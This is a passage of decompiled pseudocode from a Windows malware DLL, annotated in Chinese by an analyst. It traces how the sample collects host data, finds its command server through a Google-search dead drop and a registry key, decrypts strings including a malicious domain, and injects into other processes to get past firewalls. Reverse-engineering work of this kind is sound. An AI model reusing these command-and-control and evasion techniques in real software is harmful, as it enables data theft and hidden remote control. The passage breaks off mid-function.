  v19 = lpMem;
  v20 = v23;
  v21 = 0;
  cchString = 0;
  v9 = (_BYTE *)bj_sub_100016C8((int)&v13, (int *)&cchString);
  bj_sub_10003F45_free(v8);
  bj_sub_10003F45_free(v7);
  v10 = v27;
  v11 = 0;
  if ( v9 )
  {
    if ( cchString == 1 && *v9 == 0x32 )        // 这个是失败的标志
    {
      *((_BYTE *)v27 + 0x22) = 1;
      *a3 = 0;
      bj_sub_10002A8F_free(v9);
      v9 = 0;
    }
    if ( v9 )
    {
      *((_BYTE *)v10 + 0x22) = 1;
      v11 = bj_sub_10002FFB_receivingdatadecrypt(v9, cchString, (int)a3);
    }
  }
  return v11;
}

//----- (100052B7) --------------------------------------------------------
char __thiscall bj_getnew_ccserver_sub_100052B7(LPVOID *this)
{
  LPVOID *v1; // esi
  char v2; // bl
  int v3; // edi
  int v4; // eax
  CHAR *v5; // eax
  CHAR *v6; // esi
  const CHAR *v7; // eax
  const CHAR *v8; // edi
  const CHAR *v9; // eax
  const CHAR *v10; // ST0C_4
  LPVOID *v11; // esi
  BYTE *v12; // eax
  CHAR *v14; // [esp+8h] [ebp-20h]
  CHAR *v15; // [esp+Ch] [ebp-1Ch]
  CHAR *v16; // [esp+10h] [ebp-18h]
  LPVOID *v17; // [esp+14h] [ebp-14h]
  BYTE *v18; // [esp+14h] [ebp-14h]
  void *lpMem; // [esp+18h] [ebp-10h]
  CHAR *v20; // [esp+1Ch] [ebp-Ch]
  int v21; // [esp+20h] [ebp-8h]
  LPCSTR lpString; // [esp+24h] [ebp-4h]

  v1 = this;
  v2 = 0;
  v17 = this;
  lpString = bj_sub_100030D1_strdecrypt((int)&bj_unk_10007568, 0x11);// "9hyqMkEOWng2mJahj"
  v21 = 0;
  lpMem = (void *)bj_sub_1000553D(v1, lpString, (int)&v21);// 连接谷歌,以lpString为关键字搜索,并得到返回结果网页源码
                                                // v21返回了字节数
                                                // 注意,这里的连接过程中设置了代理服务器, 
                                                // 这个代理服务器应该就是CC服务器, 他把自己的恶意指令
                                                // 插入到了google返回的网页源码中
  if ( lpMem )
  {
    v20 = bj_sub_100030D1_strdecrypt((int)&bj_unk_10007588, 9);// "<b>%s</b>3"
    v3 = lstrlenA(v20) + 1;
    v4 = lstrlenA(lpString);
    v5 = (CHAR *)bj_sub_10003F3C_alloc(v3 + v4);
    v6 = v5;
    v14 = v5;
    wsprintfA(v5, v20, lpString);               // <b>9hyqMkEOWng2mJahj</b>3
    v7 = bj_sub_100030D1_strdecrypt((int)&bj_unk_1000757C, 2);// "=="
    v8 = v7;
    v15 = (CHAR *)v7;
    v9 = bj_sub_100030D1_strdecrypt((int)&bj_unk_10007580, 6);// "&quot;"
    v16 = (CHAR *)v9;
    v10 = v6;
    v11 = v17;
    v12 = bj_sub_10005954((int)lpMem, v21, v10, v8, v9, (int)&bj_unk_100075A0, 0xE);// "IT\x1MoD9U\x2,qk\x19S"
    v18 = v12;                                  // v10 == "<b>9hyqMkEOWng2mJahj</b>3"
    if ( v12 )                                  // v8 == "=="   v9 == "&quot;"
    {
      if ( v11[2] )
      {
        bj_sub_10002A8F_free(v11[2]);
        v12 = v18;
      }
      v11[2] = v12;
      v2 = 1;
    }
    bj_sub_10003F45_free(v16);
    bj_sub_10003F45_free(v15);
    bj_sub_10003F45_free(v14);
    bj_sub_10003F45_free(v20);
    bj_sub_10002A8F_free(lpMem);
  }
  bj_sub_10003F45_free((LPVOID)lpString);
  return v2;
}

//----- (100053C4) --------------------------------------------------------
int __thiscall bj_sub_100053C4_getproxyserver(_DWORD *this)
{
  int v1; // ecx
  int result; // eax

  v1 = this[7];
  result = 0;
  if ( v1 )
    result = *(_DWORD *)(v1 + 4);
  return result;
}

//----- (100053D2) --------------------------------------------------------
char __thiscall bj_sub_100053D2(_DWORD *this)
{
  _DWORD *v1; // eax
  char v2; // bl
  unsigned __int16 v3; // si
  int v4; // edi
  bool v5; // zf
  _DWORD *v7; // [esp+Ch] [ebp-4h]

  v1 = this;
  v2 = 0;
  v7 = this;
  v3 = 0;
  do
  {
    v4 = *(_DWORD *)(v1[6] + 4 * v3);
    if ( !v4 )
      break;
    v5 = (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v4 + 4))(v4) == 0;// 这调用差点看漏了,这里调用的是sub_100068c1
    v1 = v7;
    if ( !v5 )
    {
      v7[7] = v4;
      return 1;
    }
    ++v3;
  }
  while ( v3 < 5u );
  return v2;
}

//----- (10005414) --------------------------------------------------------
int __thiscall bj_sub_10005414_getProxyPassword(_DWORD *this)
{
  int v1; // ecx
  int result; // eax

  v1 = this[7];
  result = 0;
  if ( v1 )
    result = *(_DWORD *)(v1 + 0xC);
  return result;
}

//----- (10005422) --------------------------------------------------------
int __thiscall bj_sub_10005422_getproxyusername(_DWORD *this)
{
  int v1; // ecx
  int result; // eax

  v1 = this[7];
  result = 0;
  if ( v1 )
    result = *(_DWORD *)(v1 + 8);
  return result;
}

//----- (10005430) --------------------------------------------------------
_DWORD *__stdcall bj_sub_10005430(_DWORD *a1)
{
  _DWORD *v1; // edi
  CHAR *v2; // esi
  CHAR *v3; // ebx
  BYTE *v4; // edi
  _DWORD *v5; // ST3C_4
  BYTE *v6; // esi
  LPVOID v7; // eax
  DWORD pcbBinary; // [esp+10h] [ebp-Ch]
  DWORD cbData; // [esp+14h] [ebp-8h]
  HKEY phkResult; // [esp+18h] [ebp-4h]

  v1 = 0;
  phkResult = 0;
  v2 = bj_sub_100030D1_strdecrypt((int)bj_100074F0, 0x43);// 注册表路径解密
                                                // Software\Microsoft\Windows\CurrentVersion\Internet Settings\Servers
  if ( RegOpenKeyExA(HKEY_LOCAL_MACHINE, v2, 0, 1u, &phkResult) )
    RegOpenKeyExA(HKEY_CURRENT_USER, v2, 0, 1u, &phkResult);
  bj_sub_10003F45_free(v2);                     // 释放资源，这作者习惯真好啊
  v3 = bj_sub_100030D1_strdecrypt((int)&Domain_10007534, 6);
  cbData = 0;
  if ( !RegQueryValueExA(phkResult, v3, 0, 0, 0, &cbData) )
  {
    v4 = (BYTE *)bj_sub_10003F3C_alloc(cbData);
    RegQueryValueExA(phkResult, v3, 0, 0, v4, &cbData);// 又是那个套路，第一次设0，得到大小，第二次才是真正调用。
    v5 = bj_sub_10003F3C_alloc(8u);
    *v5 = bj_sub_100030D1_strdecrypt((int)&googledotcom_10007368, 0x2C);
    pcbBinary = 0;
    v6 = bj_sub_10002EDE_base64crypt((LPCSTR)v4, cbData, &pcbBinary);// 将v4的数据进行base64加密后(在新分配的堆空间)并返回。
    bj_sub_10003F45_free(v4);
    v7 = bj_sub_10003F3C_alloc(pcbBinary + 1);
    v1 = v5;
    v5[1] = v7;
    bj_sub_10003271_cpy((int)v7, v6, pcbBinary);// 把v6开始的pcbBinary个字节拷贝到v7
    bj_sub_10003F45_free(v6);
    *a1 = 2;
  }
  bj_sub_10003F45_free(v3);
  RegCloseKey(phkResult);
  return v1;                                    // 返回值是v5(v1=v5)
                                                // +0 是 一串解密数据
                                                // +4 是 注册表中读到的数据的BASE64
}

//----- (1000553D) --------------------------------------------------------
int __thiscall bj_sub_1000553D(_BYTE *this, LPCSTR lpString, int a3)
{
  CHAR *v3; // ebx
  int v4; // esi
  int v5; // eax
  CHAR *v6; // esi
  void *v7; // eax
  _BYTE *v9; // [esp+Ch] [ebp-Ch]
  CHAR *v10; // [esp+10h] [ebp-8h]
  CHAR *lpMem; // [esp+14h] [ebp-4h]
  int v12; // [esp+24h] [ebp+Ch]

  *(_DWORD *)a3 = 0;
  v9 = this;
  v3 = bj_sub_100030D1_strdecrypt((int)&wwwDOTgoogleDOTcom_1000753C, 14);// "www.google.com"
  lpMem = bj_sub_100030D1_strdecrypt((int)&GET_100074DC, 3);
  v10 = bj_sub_100030D1_strdecrypt((int)&bj_unk_1000754C, 27);// "search?q=%s&gws_rd = cr,ssl"
                                                // gws_rd=cr,ssl      
                                                // gws = google web server
                                                // rd = redirect
                                                // cr = country
                                                // SSL = google using SSL
  v4 = lstrlenA(v10);
  v5 = lstrlenA(lpString);                      // lpString"9hyqMkEOWng2mJahj"
  v6 = (CHAR *)bj_sub_10003F3C_alloc(v4 + v5 + 1);// v6  search?q=9hyqMkEOWng2mJahj&gws_rd = cr,ssl
  wsprintfA(v6, v10, lpString);
  if ( v9[0x20] )
    v7 = (void *)bj_sub_10004F6F(v9, (int)v3, (int)v6, 0, (int)lpMem, 0, (_DWORD *)a3);
  else
    v7 = bj_sub_10004E16(v9, v3, v6, 0, lpMem, a3);// 连接网站,搜索这个东西,并返回网页源码
                                                // a3是_Out_, 返回的字节数
  v12 = (int)v7;
  bj_sub_10003F45_free(v6);
  bj_sub_10003F45_free(v10);
  bj_sub_10003F45_free(lpMem);
  bj_sub_10003F45_free(v3);
  return v12;
}

//----- (10005600) --------------------------------------------------------
// v1缓冲区的一些初始化
_DWORD *__thiscall bj_sub_10005600(_DWORD *this)
{
  _DWORD *v1; // edi
  _DWORD *v2; // eax
  unsigned int v3; // esi
  _DWORD *v4; // eax
  unsigned int *v5; // ebx
  _DWORD *result; // eax
  char *v7; // [esp+Ch] [ebp-4h]

  v1 = this;
  this[5] = bj_sub_10004627();                  // 搜集信息 volumeserialnum
  v1[1] = bj_sub_1000418D();                    // ObtainUserAgentString的返回结果
  v2 = bj_sub_10003F04_alloc(0x10u);
  v3 = 0;
  if ( v2 )
    v4 = bj_sub_10006879(v2);
  else
    v4 = 0;
  bj_sub_10005AE1(v1, (int)v4);                 // 将v4存入v1[6][x]处
  v5 = v1 + 4;                                  // v5是+0x10
  result = bj_sub_10005430(v1 + 4);
  v1[3] = result;
  if ( !v1[4] )                                 // 如果注册表数据读取失败了，才会执行括号里的内容
  {
    *v5 = 2;                                    // 这里还是赋值了2
    result = bj_sub_1000295A_alloc(8u);         // 又是分配空间的
    v1[3] = result;
    if ( *v5 > 0 )
    {
      result = &googledotcom_10007368;
      v7 = (char *)&googledotcom_10007368;      // 只有前面的a个字节是有效数据,后面的数据就是密钥重复两边,所以异或之后就全是0了
      do
      {
        *(_DWORD *)(v1[3] + 4 * v3++) = bj_sub_100030D1_strdecrypt((int)result, 0x2C);// 如果失败了的话，v1[3]中保存一个8字节的堆空间，2个指针，指向2个字符串，
                                                // 这两个字符串是10007368开始的字符串，经过解密之后。。。
        result = v7 + 0x2C;
        v7 += 0x2C;
      }
      while ( v3 < *v5 );                       // 第一段是"google.com"
                                                // 第二段是"satellitedeluxpanorama.com"
    }
  }
  return result;
}

//----- (1000568E) --------------------------------------------------------
_BYTE *__thiscall bj_sub_1000568E_getpredefined_ccserver(LPVOID *this)
{
  LPVOID *v1; // esi
  _BYTE *result; // eax

  v1 = this;
  bj_sub_10003F45_free(this[2]);
  result = bj_sub_100030D1_strdecrypt((int)&googledotcom_10007368, 0x2C);
  v1[2] = result;                               // 又是7368处的字符串
  return result;
}

//----- (100056AD) --------------------------------------------------------
signed int __thiscall bj_reproduce_v1_3_sub_100056AD(_DWORD *this)
{
  _DWORD *v1; // esi
  unsigned int v2; // edi
  unsigned int v3; // eax

  v1 = this;
  v2 = 0;
  if ( this[4] )
  {
    do
      bj_sub_10002A8F_free(*(LPVOID *)(v1[3] + 4 * v2++));
    while ( v2 < v1[4] );
  }
  bj_sub_10002A8F_free((LPVOID)v1[3]);
  v1[3] = bj_sub_1000295A_alloc(8u);
  *(_DWORD *)v1[3] = bj_sub_100030D1_strdecrypt((int)&googledotcom_10007368, 0x2C);
  v3 = bj_sub_10002D28_strlen(v1[2]);
  *(_DWORD *)(v1[3] + 4) = bj_saveinnewheap_sub_10002AE7(v1[2], v3 + 1);
  *((_BYTE *)v1 + 0x21) = 0;
  return 1;
}

//----- (10005712) --------------------------------------------------------
// 粗略的说,如果电脑能联网,那么返回1;不能联网,返回0
char bj_sub_10005712_checkaccess2internet()
{
  char v0; // bl
  char *v1; // edi
  struct hostent *v2; // eax
  char **v3; // esi
  int v4; // edx
  int v5; // eax
  char *v6; // eax
  struct WSAData WSAData; // [esp+Ch] [ebp-190h]

  v0 = 0;
  bj_sub_10003296_memset((char *)&WSAData, 0, 0x190u);// 把WSADATA开始的0x190个字节设为0.
                                                // 设为的值，跟第二个参数有关
  WSAStartup(0x202u, &WSAData);
  v1 = (char *)bj_sub_10003F3C_alloc(0x104u);
  if ( !gethostname(v1, 260) )
  {
    v2 = gethostbyname(v1);
    if ( v2 )
    {
      v3 = v2->h_addr_list;
      v4 = 0;
      if ( *v3 )
      {
        v5 = 0;
        while ( 1 )
        {
          v6 = v3[v5];
          if ( (*v6 != 0xA9u || *(_WORD *)v6 >> 8 != 0xFEu) && *(_DWORD *)v6 != 0x100007F )
            break;                              // A9 FE xx xx
                                                // 169.254.xx.xx  似乎是个保留地址
          v5 = ++v4;                            // A 169.254.x.x means the computer has physical ethernet Link, but cannot get an IP address from your router. 
          if ( !v3[v4] )
            goto LABEL_11;
        }
        v0 = 1;                                 // 如果是break掉的，v0=1；否则v0=0
      }
    }
  }
LABEL_11:                                       // 所以说应该肯定会break
  bj_sub_10003F45_free(v1);                     // 释放v1堆空间
  WSACleanup();
  return v0;
}

//----- (100057B2) --------------------------------------------------------
signed int __thiscall bj_sub_100057B2_changeccserverintable(LPVOID *this)
{
  LPVOID *v1; // edi
  int v2; // esi
  signed int v3; // ebx
  SIZE_T v4; // ST04_4
  LPVOID v5; // eax
  unsigned int v6; // ecx
  unsigned int v7; // eax
  SIZE_T v8; // ST04_4

  v1 = this;
  v2 = 0;
  v3 = 1;
  if ( !this[4] )
  {
LABEL_4:
    if ( (unsigned int)v1[4] <= 1 )
    {
      bj_sub_1000568E_getpredefined_ccserver(v1);
      return v3;
    }
    v4 = bj_sub_10002D28_strlen(*((_DWORD *)v1[3] + 1)) + 1;
    v5 = bj_saveinnewheap_sub_10002AE7(*((_DWORD *)v1[3] + 1), v4);
    goto LABEL_6;
  }
  while ( lstrcmpiA((LPCSTR)v1[2], *((LPCSTR *)v1[3] + v2)) )// 在v1[3]里面寻找v1[2]
  {
    if ( ++v2 >= (unsigned int)v1[4] )
      goto LABEL_4;                             // 此时说明v1[2]不存在于v1[3]里
  }
  if ( v1[2] )
  {
    bj_sub_10003F45_free(v1[2]);
    v1[2] = 0;
  }
  v6 = (unsigned int)v1[4];
  if ( v2 != v6 - 1 )                           // 将v1[2]在表v1[3]中位置的后面位置的那个ip作为新的cc服务器地址
  {
    v8 = bj_sub_10002D28_strlen(*((_DWORD *)v1[3] + (v2 + 1) % v6)) + 1;
    v5 = bj_saveinnewheap_sub_10002AE7(*((_DWORD *)v1[3] + (v2 + 1) % (unsigned int)v1[4]), v8);
LABEL_6:
    v1[2] = v5;
    return v3;
  }
  if ( v6 <= 1 )
  {
    bj_sub_1000568E_getpredefined_ccserver(v1);
  }
  else
  {
    v7 = bj_sub_10002D28_strlen(*((_DWORD *)v1[3] + 1));
    v1[2] = bj_saveinnewheap_sub_10002AE7(*((_DWORD *)v1[3] + 1), v7 + 1);
  }
  return 0;
}

//----- (10005880) --------------------------------------------------------
CHAR *__thiscall bj_sub_10005880_makehttpsoptionalfield(_BYTE *this, int a2, _BYTE *a3)
{
  _BYTE *v3; // edi
  CHAR *v4; // eax
  const CHAR *v5; // esi
  unsigned int v6; // eax
  unsigned int v7; // ebx
  int v8; // esi
  unsigned int v9; // eax
  CHAR *v10; // ebx
  int v11; // eax
  int v12; // edi
  int v13; // esi
  CHAR *v14; // esi
  CHAR v16[4]; // [esp+Ch] [ebp-10h]
  int v17; // [esp+14h] [ebp-8h]
  LPVOID lpMem; // [esp+18h] [ebp-4h]

  v3 = this;
  v4 = bj_sub_100030D1_strdecrypt((int)&id_100074B8, 2);
  v5 = v4;
  lpMem = v4;
  v6 = bj_sub_10002D28_strlen((int)a3);
  v7 = v6;
  v17 = v6;
  v8 = lstrlenA(v5);
  v9 = bj_sub_10002D28_strlen(a2);
  v10 = (CHAR *)bj_sub_10003F3C_alloc(v8 + v9 + v7 + 8);
  bj_sub_10003271_cpy((int)v10, lpMem, v8);
  bj_sub_10003271_cpy((int)&v10[v8++], "=", 1);
  bj_sub_10003271_cpy((int)&v10[v8], v3 + 0x14, 4);// volumeserialnumber  不错,这样拷贝就直接是网络顺序了
  v8 += 4;
  strcpy(v16, "&%s=");
  v11 = wsprintfA(&v10[v8], v16, a2);           // &##a2##=
  v12 = v17;
  v13 = v11 + v8;
  bj_sub_10003271_cpy((int)&v10[v13], a3, v17); // id=xxxx&c=1
  v14 = bj_sub_10003123_xorencrpyt((int)v10, v13 + v12, (LPVOID)1);// 加密后,随机出来的密钥放在第一个DWORD位置,后面跟着的就是被加密的数据
  bj_sub_10003F45_free(v10);
  bj_sub_10003F45_free(lpMem);
  return v14;
}                                               // 返回 "id=<volumeserialnum>&<a2>=<a3>" 加密后

//----- (10005954) --------------------------------------------------------
// a1: 网页源码字节数组
// a2: 字节数组的大小
// lpString: "<b>9hyqMkEOWng2mJahj</b>3"   这个末尾的3别漏看了  <b>粗体
// a4: "=="
// a5: "&quot;"
// a6:  bj_unk_100075A0 字节数组,可能作为密钥还是??
// a7:  0xe
BYTE *__stdcall bj_sub_10005954(int a1, int a2, LPCSTR lpString, LPCSTR a4, LPCSTR a5, int a6, int a7)
{
  char *v7; // esi
  BYTE *v8; // ebx
  _BYTE *v9; // edi
  int v10; // ebx
  unsigned int v11; // eax
  char *v12; // edi
  char *v13; // eax
  int v15; // [esp+8h] [ebp-4h]
  int v16; // [esp+18h] [ebp+Ch]

  v7 = (char *)a1;
  v8 = 0;
  if ( a1 && a2 && lpString && a4 && a5 )
  {
    v15 = lstrlenA(lpString);
    v9 = 0;
    v10 = lstrlenA(a4);
    v11 = a1 + a2;
    v16 = a1 + a2;
    do
    {
      if ( !v7 || (unsigned int)v7 >= v11 )     // 为空或已经过了结尾
        break;
      v7 = bj_sub_100032E2_strfind(v7, lpString);
      if ( v7 )
      {
        v7 = bj_sub_10002D18_skipspace(&v7[v15]);// 参数跳过标志字符串
                                                // 函数用于跳过空格
        if ( !bj_sub_10002971_strcmp(v7, (char *)a4, v10) )
          v9 = bj_sub_10002D18_skipspace(&v7[v10]);// 跳过==,以及跟着的空格
      }
      v11 = v16;
    }
    while ( !v9 );
    v8 = 0;
    if ( v9 )
    {
      v12 = &v9[lstrlenA(a5)];
      v13 = bj_sub_100032E2_strfind(v12, a5);
      if ( v13 )
      {
        lpString = 0;
        v8 = bj_sub_10002EDE_base64crypt(v12, v13 - v12, (DWORD *)&lpString);// 上面的过程就是在网页源码中找到
                                                // <b>9hyqMkEOWng2mJahj</b>3 == &quot;value&quot;
                                                // 得到中间的这个value值
                                                // 
                                                // ==两边可有任意个空格
        bj_xordecrypt_sub_10002D31(v8, (unsigned int)lpString, a6, a7);
        bj_realloc_sub_10002AAD(v8, (SIZE_T)(lpString + 1));
      }
    }
  }
  return v8;
}

//----- (10005A54) --------------------------------------------------------
// 应该是用于确定联网方式, 如果本身进程可直接通信,那么v1+20标志位就为0,不需要注入到其他进程中;
// 否则v1+20标志位设为1,需要注入到其他进程中进行网络通信
int __thiscall bj_sub_10005A54_checkaccess2ccserver(void *this)
{
  _DWORD *v1; // esi
  const CHAR *v2; // ST04_4
  int v3; // eax
  CHAR *v4; // edi
  int v6; // eax
  int v7; // eax
  CHAR *v8; // [esp-4h] [ebp-Ch]

  v1 = this;
  bj_sub_1000568E_getpredefined_ccserver((LPVOID *)this);// v1+2处的赋值
  v2 = (const CHAR *)v1[1];
  *((_BYTE *)v1 + 0x20) = 0;
  v3 = lstrlenA(v2);
  v4 = bj_sub_10002F22_base64crypt((BYTE *)v1[1], v3);//   v1+1处的信息，以及信息的长度
  if ( bj_sub_10005BED_internetoperation((LPCSTR *)v1, v4) )
    goto LABEL_2;
  if ( bj_sub_100053D2(v1) )
  {
    v6 = bj_sub_10005BED_internetoperation((LPCSTR *)v1, v4);
    v8 = v4;
    if ( v6 )
      goto LABEL_3;
    if ( bj_sub_10005C35_inject_to_make_other_process_performing_internet_operation_and_get_result(v1, v4) )
    {
      *((_BYTE *)v1 + 0x20) = 1;
LABEL_2:
      v8 = v4;
LABEL_3:
      bj_sub_10003F45_free(v8);
      return bj_sub_100057B2_changeccserverintable((LPVOID *)v1);
    }
  }
  bj_sub_10004829_free(v1);
  v7 = bj_sub_10005C35_inject_to_make_other_process_performing_internet_operation_and_get_result(v1, v4);
  v8 = v4;
  if ( v7 )
  {
    *((_BYTE *)v1 + 0x20) = 1;
    goto LABEL_3;
  }
  bj_sub_10003F45_free(v4);
  return 0;
}

//----- (10005AE1) --------------------------------------------------------
int __thiscall bj_sub_10005AE1(_DWORD *this, int a2)
{
  int v2; // esi
  unsigned __int16 v3; // dx
  int result; // eax

  v2 = this[6];
  v3 = 0;
  while ( 1 )                                   // 找到 this[6]里面第一个值为0的地方
  {
    result = v3;
    if ( !*(_DWORD *)(v2 + 4 * v3) )
      break;
    if ( ++v3 >= 5u )
      return result;
  }
  result = a2;
  *(_DWORD *)(v2 + 4 * v3) = a2;
  return result;
}

//----- (10005B0A) --------------------------------------------------------
HANDLE __stdcall bj_sub_10005B0A_updateccserverinfoinregistry(LPCSTR lpString)
{
  const CHAR *v1; // ebx
  CHAR *v2; // ebx
  int v3; // eax
  CHAR *v4; // eax
  BYTE *v5; // edi
  int v6; // eax
  CHAR *lpMem; // [esp+Ch] [ebp-8h]
  HKEY phkResult; // [esp+10h] [ebp-4h]

  v1 = bj_sub_100030D1_strdecrypt((int)bj_100074F0, 0x43);// "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Servers\x1d"
  phkResult = 0;                                //  Domain --> "google.com"
  lpMem = (CHAR *)v1;
  if ( RegCreateKeyExA(HKEY_LOCAL_MACHINE, v1, 0, 0, 0, 2u, 0, &phkResult, 0) )
    RegCreateKeyExA(HKEY_CURRENT_USER, v1, 0, 0, 0, 2u, 0, &phkResult, 0);
  v2 = bj_sub_100030D1_strdecrypt((int)&Domain_10007534, 6);
  v3 = lstrlenA(lpString);
  v4 = bj_sub_10002F22_base64crypt((BYTE *)lpString, v3);
  v5 = (BYTE *)v4;
  v6 = lstrlenA(v4);
  RegSetValueExA(phkResult, v2, 0, 1u, v5, v6);
  bj_sub_10003F45_free(v5);
  bj_sub_10003F45_free(v2);
  RegCloseKey(phkResult);
  return bj_sub_10003F45_free(lpMem);
}

//----- (10005BBE) --------------------------------------------------------
// 如果*(BYTE*)(this+0x20)==1,那么就把网络操作代码注入到预先指定的进程中执行,然后得到返回值.
// 如果*(BYTE*)(this+0x20)!=1,那么就直接在本进程中进行网络操作..
// 
// 估计这样是为了绕过防火墙
int __thiscall bj_sub_10005BBE_postdatatoserver(int this, LPVOID lpOptional)
{
  signed int v2; // esi

  v2 = 0;
  if ( *(_BYTE *)(this + 0x20) )
  {
    if ( bj_sub_10005C35_inject_to_make_other_process_performing_internet_operation_and_get_result(
           (int *)this,
           lpOptional) )
    {
      v2 = 1;
    }
  }
  else if ( bj_sub_10005BED_internetoperation((LPCSTR *)this, lpOptional) )
  {
    v2 = 1;
  }
  return v2;
}

//----- (10005BED) --------------------------------------------------------
int __thiscall bj_sub_10005BED_internetoperation(LPCSTR *this, LPVOID lpOptional)
{
  signed int v2; // esi
  int v3; // edi
  int v5; // [esp+8h] [ebp-Ch]
  int v6; // [esp+Ch] [ebp-8h]
  int v7; // [esp+10h] [ebp-4h]

  v2 = 0;
  v5 = 0;                                       // hInternetOpen
  v6 = 0;                                       // hInternetConnect
  v7 = 0;                                       // hInternetOpenRequest
  v3 = bj_sub_1000486B(this, (int)&v5, lpOptional);
  bj_sub_1000484B_closehandle((HINTERNET *)&v5);// 你妹的，就为了关个句柄。。
  if ( v3 == 200 || v3 == 404 )
    v2 = 1;                                     // 可以理解为如果网站还没倒闭，那么就返回1
  return v2;
}

//----- (10005C35) --------------------------------------------------------
int __thiscall bj_sub_10005C35_inject_to_make_other_process_performing_internet_operation_and_get_result(int *this, LPVOID lpMem)
{
  int *v2; // esi
  int lpszProxyName; // ebx
  int lpProxyPassword; // esi
  signed int v5; // edx
  void *v6; // edi
  signed int v7; // ebx
  void *v8; // esi
  int UAString; // [esp+Ch] [ebp-3Ch] 这里从&UAString开始一直到&v19, 都是一个结构体, 作为一个函数参数被传入
  int v11; // [esp+10h] [ebp-38h]
  int v12; // [esp+14h] [ebp-34h]
  int servertoconnect; // [esp+18h] [ebp-30h]
  int v14; // [esp+1Ch] [ebp-2Ch]
  int v15; // [esp+20h] [ebp-28h]
  LPVOID v16; // [esp+24h] [ebp-24h]
  LPVOID v17; // [esp+28h] [ebp-20h]
  int v18; // [esp+2Ch] [ebp-1Ch]
  LPVOID v19; // [esp+30h] [ebp-18h]
  LPVOID v20; // [esp+34h] [ebp-14h]
  LPVOID v21; // [esp+38h] [ebp-10h]
  int lpProxyUserName; // [esp+3Ch] [ebp-Ch]
  int *v23; // [esp+40h] [ebp-8h]
  int v24; // [esp+44h] [ebp-4h]
  _BYTE *lpMema; // [esp+50h] [ebp+8h]

  v2 = this;
  v23 = this;
  v20 = bj_sub_10005001_datacollect(this);
  v21 = bj_sub_100030D1_strdecrypt((int)&POST_100074D8, 4);
  lpszProxyName = bj_sub_100053C4_getproxyserver(v2);
  lpProxyUserName = bj_sub_10005422_getproxyusername(v2);
  lpProxyPassword = bj_sub_10005414_getProxyPassword(v2);
  v5 = 0;
  if ( lpszProxyName )
    v5 = 3;
  memset(&v11, 0, 0x24u);
  v6 = v20;
  v12 = lpszProxyName;
  v7 = 0;
  v15 = lpProxyPassword;
  v8 = v21;
  UAString = v23[1];
  servertoconnect = v23[2];
  v14 = lpProxyUserName;
  v19 = lpMem;
  v11 = v5;
  v16 = v21;
  v17 = v20;
  v18 = 0;
  v24 = 0;
  lpMema = (_BYTE *)bj_sub_10001EE5((int)&UAString, &v24);// 注意, 这里传入的参数,是从&UAString这个开始,一直往后好几个.
                                                // 所以传入的其实是个结构体指针...
  bj_sub_10003F45_free(v8);
  bj_sub_10003F45_free(v6);
  if ( lpMema && v24 == 1 && *lpMema == 0x32 )  // 这说明从filemapping读取的数据长度为1, 而且该数据必须为0x32,那么才算成功.
    v7 = 1;                                     // 必须为1, 才算成功
  bj_sub_10002A8F_free(lpMema);
  return v7;
}

//----- (10005D0A) --------------------------------------------------------
// 最主要的函数
void __thiscall __noreturn bj_sub_10005D0A(LPCSTR *this)
{
  LPCSTR *v1; // ebx
  char v2; // al
  void (__stdcall *v3)(DWORD); // esi
  CHAR *v4; // edi
  char v5; // al
  _BYTE *v6; // eax
  int v7; // edi
  _BYTE *v8; // eax
  void *v9; // eax
  void *v10; // edi
  char v11; // al
  _DWORD *v12; // eax
  _DWORD *v13; // esi
  CHAR *ipaddress; // eax
  CHAR *v15; // edi
  _BYTE *v16; // edi
  _BYTE *v17; // eax
  CHAR *v18; // eax
  void *v19; // eax
  CHAR *v20; // ebx
  _BYTE *v21; // edi
  CHAR *v22; // esi
  _BYTE *v23; // edi
  CHAR *v24; // esi
  int v25; // eax
  int v26; // eax
  _BYTE *v27; // edi
  CHAR *v28; // esi
  int v29; // eax
  int v30; // eax
  CHAR *v31; // esi
  _BYTE *v32; // edi
  CHAR *v33; // esi
  void *v34; // esi
  void *v35; // [esp+Ch] [ebp-28h]
  void *v36; // [esp+10h] [ebp-24h]
  CHAR *v37; // [esp+14h] [ebp-20h]
  void *v38; // [esp+18h] [ebp-1Ch]
  CHAR *v39; // [esp+1Ch] [ebp-18h]
  void *v40; // [esp+1Ch] [ebp-18h]
  void *v41; // [esp+20h] [ebp-14h]
  LPCSTR *v42; // [esp+24h] [ebp-10h]
  DWORD nNumberOfBytesRead; // [esp+28h] [ebp-Ch]
  int v44; // [esp+2Ch] [ebp-8h]
  LPVOID lpMem; // [esp+30h] [ebp-4h]

  v1 = this;
  v42 = this;
  v2 = bj_sub_10005712_checkaccess2internet();  // 电脑能联网，返回1,；电脑不能联网返回0
  v3 = Sleep;
  while ( v2 != 1 )
  {
    Sleep(0x2710u);
    v2 = bj_sub_10005712_checkaccess2internet();
  }
  bj_sub_10005600(v1);                          // 一些配置的初始化
  while ( !bj_sub_10005A54_checkaccess2ccserver(v1) )// 返回1代表操作成功，否则一直循环这个函数。
    Sleep(0x2710u);
  v4 = bj_sub_100049AA_pcdatacollection(v1);    // 收集各种信息
  while ( 1 )
  {
    while ( 1 )
    {
      if ( bj_sub_10005BBE_postdatatoserver((int)v1, v4) )// 连接v1[2],并发送收集到的数据v4
      {
        if ( *((_BYTE *)v1 + 0x21) )            // 更新 CC服务器
        {
          bj_sub_10005B0A_updateccserverinfoinregistry(v1[2]);// 注册表 创建 key并set value 
                                                // 以新恶意域名作为数据.
          bj_reproduce_v1_3_sub_100056AD(v1);
        }
        bj_sub_10003F45_free(v4);
        while ( 1 )
        {
          while ( bj_sub_10005712_checkaccess2internet() != 1 )
            v3(0x2710u);
          while ( !bj_sub_10005A54_checkaccess2ccserver(v1) )
            v3(0x2710u);
          v6 = bj_sub_100030D1_strdecrypt((int)&c_1000735B, 1);
          v7 = (int)v6;
          v41 = v6;
          v8 = bj_sub_100030D1_strdecrypt((int)&ONE_10007358, 1);// "1"
          v35 = v8;
          v9 = bj_sub_10005880_makehttpsoptionalfield(v1, v7, v8);// v1 "c" "1"
          v44 = 0;
          lpMem = v9;
          *((_BYTE *)v1 + 0x22) = 0;
          do                                    // 接收命令文件的循环
          {
            v10 = *((_BYTE *)v1 + 0x20) ? bj_sub_100051C0_inject_getfilefromserver((int *)v1, (int)v9, &v44) : bj_sub_100050FD_getfilefromserver(v1, (int)v9, (int)&v44);
            v38 = v10;
            if ( v10 || *((_BYTE *)v1 + 0x22) )
              break;
